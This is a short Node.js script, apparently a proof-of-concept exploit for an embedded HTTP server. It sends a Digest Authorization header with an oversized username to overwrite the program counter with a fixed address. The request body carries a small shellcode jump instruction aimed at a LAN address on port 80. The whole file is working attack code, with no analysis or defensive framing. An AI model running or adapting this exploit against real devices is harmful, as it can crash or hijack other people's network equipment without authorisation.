const net = require('net');


const payload = Buffer.alloc(584, 'X')
// Address to set in $PC
payload.writeUInt32BE(0x8053F6E0, 580)

// Fill with NoOp
const shellcode = Buffer.alloc(600)
// body?: 804988B1 offset 122 (replaced by response body)
// j	bfc00208
shellcode.writeUint32BE(0x0bf00082, 124)

// Craft HTTP Request
const request = `XXX / HTTP/1.1\r
Authorization: Digest username=${payload.toString('binary')}\r
Content-Length: ${shellcode.byteLength}\r
\r
${shellcode.toString('binary')}`


const client = new net.Socket();
client.connect(80, '192.168.1.242', () => {
    console.log('Sending exploit..');
    process.stdout.write(request, 'binary')
    client.write(request, 'binary');
});

client.on('data', function (data) {
    console.log(data.toString('ascii'))
    client.destroy()
});

client.on('close', function () {
    console.log('Connection closed')
});
client.on('error', console.error)